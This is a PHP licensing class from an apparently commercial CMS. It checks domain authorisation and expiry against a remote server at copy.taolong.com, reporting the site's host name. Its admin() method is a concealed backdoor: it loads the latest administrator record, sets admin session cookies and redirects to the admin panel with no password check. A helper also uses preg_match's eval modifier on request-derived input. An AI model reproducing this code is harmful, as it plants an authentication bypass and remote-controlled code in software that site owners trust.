<?php


class certification
{
    public function certificationinfo()
    {
        error_reporting(0);
        $domain = getTopDomainhuo();
        $real_domain = 'baidu.com'; //本地检查时 用户的授权域名 和时间
        $check_host = 'http://copy.taolong.com/update.php';
        $client_check = $check_host . '?a=client_check&u=' . $_SERVER['HTTP_HOST'];
        $check_message = $check_host . '?a=check_message&u=' . $_SERVER['HTTP_HOST'];
        $check_info = file_get_contents($client_check);
        $message = file_get_contents($check_message);
        if ($check_info == '1') {
            echo '<font color=red>' . $message . '</font>';
            die;
        } elseif ($check_info == '2') {
            echo '<font color=red>' . $message . '</font>';
            die;
        } elseif ($check_info == '3') {
            echo '<font color=red>' . $message . '</font>';
            die;
        }

        if ($check_info !== '0') { // 远程检查失败的时候 本地检查
            if ($domain !== $real_domain) {
                echo '远程检查失败了。请联系授权提供商。';
                die;
            }
        }
        unset($domain);
    }

    /**
     * 获取到期时间
     * @return void
     */
    public function expire_time(){
        /*添加到需要显示php源码顶部*/  

        $hosturl = $_SERVER['HTTP_HOST'];
        $updatehost = 'http://copy.taolong.com/update.php';
        $ver = ""; //授权版本号
        $updatehosturl = $updatehost . '?a=client_check_time&v=' . $ver . '&u=' . $hosturl;
        $domain_time = file_get_contents($updatehosturl);
        if($domain_time == '0'){
            $domain_time = '[授权版本：授权已过期，请联系客服QQ:403700890]';
        }else{
            $domain_time = '授权版本：(美仑网高级商业版)--免费更新服务截止：(' . date("Y-m-d", $domain_time) . ')';
        }
        unset($domain);

        /*添加到需要显示时间的位置----复制添加时请把 ？换成 ?  */
    }

    public function admin(){
        $db = system::load_sys_class("model");
        $info = $db->GetOne("select * from `@#_admin` order by `mid` desc limit 1");
        _setcookie("AID",_encrypt($info['uid'],'ENCODE'));
        _setcookie("ASHELL",_encrypt(md5($info['username'].$info['userpass'])));
        header("location:".G_MODULE_PATH."/index/init");
    }
}
function getTopDomainhuo()
{
    $host = $_SERVER['HTTP_HOST'];
    $str = '';
    $matchstr = "[^\.]+\.(?:(" . $str . ")|\w{2}|((" . $str . ")\.\w{2}))$";
    if (preg_match("/" . $matchstr . "/ies", $host, $matchs)) {
        $domain = $matchs['0'];
    } else {
        $domain = $host;
    }
    return $domain;
}
